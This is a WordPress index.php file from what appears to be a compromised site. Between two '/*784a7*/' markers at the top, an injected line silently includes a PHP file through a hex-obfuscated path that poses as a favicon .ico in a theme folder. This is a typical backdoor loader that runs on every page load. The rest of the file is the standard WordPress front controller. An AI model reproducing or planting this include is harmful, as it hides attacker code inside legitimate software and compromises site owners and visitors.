<?php
/*784a7*/

@include "\x2fhome\x2fmank\x69ngph\x61rma/\x70ubli\x63_htm\x6c/wp-\x63onte\x6et/th\x65mes/\x74went\x79seve\x6eteen\x2ffavi\x63on_a\x301f84\x2eico";

/*784a7*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
